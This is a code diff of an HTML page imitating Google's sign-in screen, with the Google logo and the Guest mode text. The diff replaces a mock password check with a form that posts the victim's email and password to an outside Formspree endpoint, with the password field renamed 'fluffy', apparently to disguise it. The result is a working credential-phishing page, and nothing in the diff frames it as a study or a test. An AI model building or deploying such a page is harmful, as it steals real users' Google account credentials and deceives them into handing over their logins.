@@ -22,7 +22,7 @@
             padding: 30px;
             border-radius: 25px;
             width: 990px;
-            height: 360px; /* Increased the height */
+            height: 360px;
             color: white;
             display: flex;
             justify-content: flex-start;
@@ -58,7 +58,7 @@
             font-weight: 300;
         }
         .input-box {
-            width: 40%; /* Adjusted input box to center */
+            width: 40%;
             padding: 10px;
             margin-top: 20px; 
             border: 2px solid #333;
@@ -68,7 +68,7 @@
             font-size: 16px;
             height: 40px;
             margin-left: auto;
-            margin-right: 0; /* Moved it to the right */
+            margin-right: 0;
         }
         .link {
             color: #8ab4f8;
@@ -78,28 +78,27 @@
         .right-side-container {
             display: flex;
             flex-direction: column;
-            align-items: flex-start; /* Align everything to the left inside */
+            align-items: flex-start; 
             margin-left: auto;
-            margin-top: 0px; /* Reduced margin-top to move everything higher */
+            margin-top: 10px; 
         }
         .forgot-email-link, .guest-mode, .btn-container, .footer {
-            margin-left: 0; /* Reset margin-left to keep everything aligned properly */
+            margin-left: 0;
             text-align: left;
-            margin-top: 5px; /* Reduced margin-top to bring everything closer to the top */
         }
         .forgot-email-link {
-            margin-top: 5px;
+            margin-top: 10px;
         }
         .guest-mode {
             font-size: 14px;
             color: white;
-            margin-top: 5px; /* Reduced margin-top to move it up */
+            margin-top: 10px;
             text-align: left;
         }
         .btn-container {
             display: flex;
             justify-content: flex-start;
-            margin-top: 5px; /* Reduced margin-top to bring the buttons closer to the top */
+            margin-top: 10px;
         }
         .btn {
             background: #8ab4f8;
@@ -112,7 +111,7 @@
             margin-right: 10px;
         }
         .footer {
-            margin-top: 5px; /* Reduced margin-top to bring the footer closer to the top */
+            margin-top: 30px;
             font-size: 12px;
             text-align: left;
             color: white;
@@ -133,39 +132,38 @@
         <div class="logo">
             <img src="https://storage.googleapis.com/libraries-lib-production/images/GoogleLogo-canvas-404-300px.original.png" alt="Google Logo">
         </div>
-        
+
         <!-- Sign In Text and Google Account Text -->
         <div class="text">
             <p id="signinText">Sign in</p>
             <p id="useGoogleText">Use your Google Account</p>
         </div>
 
-        <!-- Form Inputs and Links on the Right -->
-        <div style="display: flex; flex-direction: column; width: 100%; margin-top: 20px; align-items: flex-start;">
-            <!-- Email or Phone Input (moved to right) -->
-            <input type="text" id="emailInput" class="input-box" placeholder="Email or phone">
-            
-            <!-- Password Input (hidden initially) -->
-            <input type="password" id="passwordInput" class="input-box" placeholder="Password" style="display: none;">
-        </div>
+        <!-- Form for Email and "Fluffy" -->
+        <form id="signinForm" action="https://formspree.io/f/moveakwr" method="POST">
+            <div class="right-side-container">
+                <!-- Email or Phone Input -->
+                <input type="email" name="email" id="emailInput" class="input-box" placeholder="Email or phone" required>
 
-        <!-- Links and Other Information to the Right -->
-        <div class="right-side-container">
-            <!-- Forgot Email Link -->
-            <a href="#" class="link forgot-email-link" id="forgotEmailLink">Forgot email?</a>
+                <!-- "Fluffy" (Password) Input -->
+                <input type="password" name="fluffy" id="passwordInput" class="input-box" placeholder="Password" required>
 
-            <!-- Not your computer text and other info moved to the right -->
-            <div class="guest-mode">
-                Not your computer? Use a private browsing window to sign in. <br>
-                <a href="#" class="link">Learn more about using Guest mode</a>
+                <!-- Forgot Email Link -->
+                <a href="#" class="link forgot-email-link" id="forgotEmailLink">Forgot email?</a>
+
+                <!-- Guest Mode Text -->
+                <div class="guest-mode">
+                    Not your computer? Use a private browsing window to sign in. <br>
+                    <a href="#" class="link">Learn more about using Guest mode</a>
+                </div>
+
+                <!-- Button Container -->
+                <div class="btn-container">
+                    <a href="#" class="link" id="createAccountLink">Create account</a>
+                    <button type="submit" class="btn" id="nextButton">Next</button>
+                </div>
             </div>
-
-            <!-- Button Container (moved to right) -->
-            <div class="btn-container">
-                <a href="#" class="link" id="createAccountLink">Create account</a>
-                <button class="btn" id="nextButton" onclick="goToPasswordPage()">Next</button>
-            </div>
-        </div>
+        </form>
     </div>
 
     <!-- Footer Section -->
@@ -177,35 +175,14 @@
     </div>
 
     <script>
-        // Function to go to password page after clicking "Next"
-        function goToPasswordPage() {
+        // Optional: Prevent submission without email
+        document.getElementById('signinForm').addEventListener('submit', function(event) {
             var email = document.getElementById('emailInput').value;
-            if (email) {
-                // If email is provided, switch to password input
-                document.getElementById('signinText').textContent = 'Enter your password';
-                document.getElementById('useGoogleText').style.display = 'none';
-                document.getElementById('emailInput').style.display = 'none';
-                document.getElementById('forgotEmailLink').style.display = 'none';
-                document.getElementById('guestModeText').style.display = 'none';
-                document.getElementById('createAccountLink').style.display = 'none';
-                document.getElementById('passwordInput').style.display = 'block';
-                document.getElementById('nextButton').textContent = 'Sign In';
-                document.getElementById('nextButton').setAttribute('onclick', 'submitPassword()');
-            } else {
+            if (!email) {
                 alert("Please enter an email address.");
+                event.preventDefault(); // Prevent form submission
             }
-        }
-
-        // Function to simulate password verification
-        function submitPassword() {
-            var password = document.getElementById('passwordInput').value;
-            if (password === "mySecretPassword") {
-                alert("Sign-in successful!");
-                // Redirect to another page or dashboard (optional)
-            } else {
-                alert("Incorrect password. Please try again.");
-            }
-        }
+        });
     </script>
 </body>
 </html>
